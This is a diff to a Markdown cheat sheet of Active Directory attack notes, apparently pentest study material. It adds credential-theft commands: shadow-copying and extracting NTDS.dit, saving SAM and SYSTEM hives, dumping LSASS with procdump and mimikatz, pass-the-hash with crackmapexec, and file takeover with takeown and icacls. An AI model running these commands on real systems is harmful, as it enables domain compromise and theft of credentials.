@@ -37,18 +37,50 @@ Authentication methods: LM, NTLM, NTLMv1, NTLMv2, Kerberos
 
  - Special rights that can lead to privilege escalation or access to sensitive files
  - **SeRemoteInteractiveLogonRight**: allow access throught RDP
- - **SeBackupPrivilege**: can do backup, so can backup sensistive files like the SAM and SYSTEM Registry hives and the NTDS.dit Active Directory database file
- - **SeDebugPrivilege**: can attach and debug a process. Can read memory of  Local System Authority (LSASS) and use mimikatz to get creds
+ - **SeBackupPrivilege**: 
+   * can do backup, so can backup sensistive files like the SAM and SYSTEM Registry hives and the NTDS.dit Active Directory database file. 
+   * It also permits logging in locally to a DC, which can be used to grab `NTDS.dit` which contains NTLM hashes. 
+   * [Tool to ease the use of SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)
+   * [diskshadow to create a new disk so that NTDIS.dit is not in used](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)
+ 
+```
+> diskshadow.exe
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+
+> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit ntds.dit
+> reg save HKLM\SYSTEM SYSTEM.SAV
+> reg save HKLM\SAM SAM.SAV
+$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+> Import-Module .\DSInternals.psd1
+> $key = Get-BootKey -SystemHivePath .\SYSTEM
+> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+```
+
+ - **SeDebugPrivilege**: can attach and debug a process. 
+   * Can read memory of  Local System Authority (LSASS) and use mimikatz to get creds. Can run `procdump.exe -ma lsass.exe lsass.dmp` to dump tokens stored in LSA, extract them with `mimikatz sekurlsa::minidump lsass.dmp` to load the dump the `mimikatz sekurlsa::logonpasswords` to get the hash and do a pass-the-hash attack
+   * Can create a sub-process that can inheritate the parent process right ([psgetsystem](https://github.com/decoder-it/psgetsystem))
  - **SeImpersonatePrivilege**: can impersonate a privileged account like NT AUTHORITY\SYSTEM
  - **SeLoadDriverPrivilege**: can load drivers
- - **SeTakeOwnershipPrivilege**: take ownership of an object and so read a file share or a file on a share
+ - **SeTakeOwnershipPrivilege**: take ownership of an object and so read a file share or a file on a share. 
+   * Take ownership of a file: `takeown /f <filename>`
+   * Get ownership: `Get-ChildItem -Path <filename> | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}`
+   * Grant full privileges over a file: `icacls <filename> /grant <username>:F`
  - List Standard domain users: `whoami /priv`@sr
 
 ### Group Policy
 
  - Use to manage user setting, applications, OS... Policy that can be applied to user and computer (disabling USB port, enforce password poligy, managing apps, ...)
  - Gaining rights over a Group Policy Object could lead to lateral movement, privesc, ...
- - 
+ - [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) application that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO. 
 
 ### PowerShell Commands
 
@@ -71,7 +103,9 @@ Hosts save the last ten hashes for any domain users that successfully log into t
 
 Tools:
 
- - crackmapexec smb 10.10.10.10 -u username -H e46b9e548fa0d122de7f59fb6d48eaa2
+ - `crackmapexec smb 10.10.10.10 -u username -p '<password>' [--users| --session | --groups | ...]`
+ - `crackmapexec smb 10.10.10.10 -u username -H ntlm_hash_e46b9e548fa0d122de7f59fb6d48eaa2`
+ - [crackmapexec smb ref](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference)
 
 #### Kerberoasting
 
@@ -99,6 +133,7 @@ The KRBTGT password hash may be obtained using OS Credential Dumping and privile
  - [ASREPRoast](https://blog.harmj0y.net/activedirectory/roasting-as-reps/)
  - [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
  - Golden Tickets
+ - A DNS server is often run on DC, can [lead to SYSTEM on DC](https://adsecurity.org/?p=4064)
 
 ### History
 
@@ -120,6 +155,7 @@ The KRBTGT password hash may be obtained using OS Credential Dumping and privile
  - mimikatz: extract TGT/TGS from memory
  - CrackMapExec
  - Responder: https://github.com/SpiderLabs/Responder/commits/master?after=c02c74853298ea52a2bfaa4d250c3898886a44ac+174&branch=master
+ - [Inveigh](https://github.com/Kevin-Robertson/Inveigh): Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. 
 
 ## References
 
